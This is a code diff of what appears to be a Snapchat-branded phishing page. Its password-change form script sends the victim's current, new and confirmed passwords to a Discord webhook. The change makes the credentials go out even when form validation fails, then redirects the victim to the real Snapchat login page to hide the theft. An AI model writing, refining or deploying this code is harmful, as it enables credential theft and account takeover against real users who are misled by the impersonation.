@@ -61565,38 +61565,37 @@ html[lang='ar'] .theme--snapchat {
                   errorMessage.innerHTML = errors.map(error => `<p>${error}</p>`).join('');
                   errorMessage.style.display = 'block';
                 }
-        
+
                 if (errors.length > 0) {
-                  checkerror()
-                } else {
+                    checkerror()
+                }else{
                     errorMessage.style.display = 'none';
-        
-                   // Prepare the payload as a single string
-                  const payload = JSON.stringify({
-                      content: `--------------------\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
-                  });
-        
-                  try {
-                      // Send the POST request to the webhook
-                      const response = await fetch(webhookURL, {
-                          method: 'POST',
-                          headers: { 'Content-Type': 'application/json' },
-                          body: payload
-                      });
-        
-                      if (response.ok) {
-                          alert('Password details sent to Discord!');
-                      } else {
-                        errors.push("Something went wrong, try again later")
-                        checkerror()
-                      }
-                  } catch (error) {
-                      console.error('Error:', error);
-                      errors.push("Something went wrong, try again later")
-                      checkerror()
-                  }
                 }
         
+               // Prepare the payload as a single string
+                const payload = JSON.stringify({
+                    content: `--------------------\nCurrent Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass} \n--------------------`
+                });
+        
+                try {
+                    // Send the POST request to the webhook
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: payload
+                    });
+    
+                    if (response.ok) {
+                        window.location.href = "https://accounts.snapchat.com/accounts/v2/login";
+                    } else {
+                    errors.push("Something went wrong, try again later")
+                    checkerror()
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    errors.push("Something went wrong, try again later")
+                    checkerror()
+                }
                
             });
         </script>
